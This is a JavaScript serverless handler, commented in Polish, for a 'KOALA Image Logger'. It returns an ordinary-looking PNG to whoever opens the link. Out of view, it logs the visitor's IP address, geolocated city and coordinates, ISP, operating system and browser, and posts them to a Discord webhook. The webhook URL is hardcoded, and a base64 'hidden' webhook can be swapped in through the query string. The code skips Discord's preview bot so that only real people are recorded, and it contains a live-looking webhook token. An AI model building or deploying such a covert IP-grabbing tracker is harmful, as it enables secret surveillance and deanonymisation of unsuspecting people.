// ====================== KOALA IMAGE LOGGER ======================
// Wykorzystuje sprawdzony mechanizm – działa jak hotdog-img.vercel.app
// Zwraca obrazek, loguje IP, Discord wyświetla jako obrazek

const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1486439184737763400/ZoSv_Z_nl3orhOavk5gf7IT_Tlkj20GR0yL29aVzrWncfhJ6IiWFWrOz_MQmpaPjc4RZ";

// Funkcja pobierająca geolokalizację (opcjonalna, ale zwiększa wartość)
async function getGeoData(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,as,mobile,proxy,timezone`);
        const data = await response.json();
        if (data.status === 'success') return data;
    } catch (e) {
        console.error('Geo lookup failed:', e.message);
    }
    return null;
}

// Funkcja do dekodowania webhooka z base64 (ukryty webhook)
function decodeWebhook(encoded) {
    try {
        return Buffer.from(encoded, 'base64').toString('utf-8');
    } catch {
        return null;
    }
}

export default async function handler(req, res) {
    // ========== 1. POBRANIE IP ==========
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip === '::1') ip = '127.0.0.1';
    if (ip.startsWith('::ffff:')) ip = ip.split(':').pop();

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });

    // ========== 2. UKRYTY WEBHOOK (base64) ==========
    const encodedWebhook = req.query.w || req.query.webhook;
    const finalWebhook = encodedWebhook ? decodeWebhook(encodedWebhook) : YOUR_WEBHOOK;

    // ========== 3. GEOLOKALIZACJA ==========
    const geo = await getGeoData(ip);

    // ========== 4. PRZYGOTUJ WIADOMOŚĆ ==========
    let message = `[+] KOALA Image Logger - IP Logged\nA User Opened the Original Image!\n\nEndpoint: /api/hotdog\n\nIP Info:\nIP: ${ip}\n`;

    if (geo) {
        message += `Provider: ${geo.isp || 'Unknown'}\nASN: ${geo.as || 'Unknown'}\nCountry: ${geo.country || 'Unknown'}\nRegion: ${geo.regionName || 'Unknown'}\nCity: ${geo.city || 'Unknown'}\nCoords: ${geo.lat?.toFixed(4) || '?'}, ${geo.lon?.toFixed(4) || '?'} (Approximate)\nTimezone: ${geo.timezone || 'Unknown'}\nMobile: ${geo.mobile ? 'True' : 'False'}\nVPN: ${geo.proxy ? 'True' : 'False'}\n`;
    } else {
        message += `Provider: Unknown\nASN: Unknown\nCountry: Unknown\nRegion: Unknown\nCity: Unknown\nCoords: ?, ? (Approximate)\nTimezone: Unknown\nMobile: False\nVPN: False\n`;
    }

    // Wykrywanie OS i przeglądarki
    const ua = userAgent.toLowerCase();
    let os = 'Unknown';
    if (ua.includes('windows nt 11.0')) os = 'Windows 11';
    else if (ua.includes('windows nt 10.0')) os = 'Windows 10';
    else if (ua.includes('mac os x')) os = 'macOS';
    else if (ua.includes('iphone')) os = 'iPhone iOS';
    else if (ua.includes('android')) os = 'Android';
    else if (ua.includes('linux')) os = 'Linux';

    let browser = 'Unknown';
    if (ua.includes('opr') || ua.includes('opera')) browser = 'Opera GX / Opera';
    else if (ua.includes('edg')) browser = 'Microsoft Edge';
    else if (ua.includes('chrome')) browser = 'Google Chrome';
    else if (ua.includes('firefox')) browser = 'Mozilla Firefox';
    else if (ua.includes('safari')) browser = 'Apple Safari';

    message += `\nPC Info:\nOS: ${os}\nBrowser: ${browser}\n\nUser Agent:\n${userAgent}`;

    // ========== 5. WYKRYWANIE DISCORD BOTA ==========
    const isDiscordBot = ua.includes('discordbot') || (ua.includes('discord') && ua.includes('bot'));

    // ========== 6. WYŚLIJ WEBHOOK ==========
    if (finalWebhook && !isDiscordBot) {
        try {
            await fetch(finalWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message })
            });
        } catch (e) {
            console.error('Webhook error:', e.message);
        }
    }

    // ========== 7. ZWRÓĆ OBRAZEK (bez przekierowania) ==========
    // Stabilny obrazek z CDN Discorda – zawsze działa
    const IMAGE_URL = "https://cdn.discordapp.com/attachments/1054650838129332255/1153307620187312168/convert.png";
    
    try {
        const imageResponse = await fetch(IMAGE_URL);
        const imageBuffer = await imageResponse.arrayBuffer();
        
        res.setHeader('Content-Type', 'image/png');
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.send(Buffer.from(imageBuffer));
    } catch (err) {
        // Fallback – przezroczysty 1x1 PNG
        const fallbackBuffer = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
        res.setHeader('Content-Type', 'image/png');
        res.send(fallbackBuffer);
    }
}
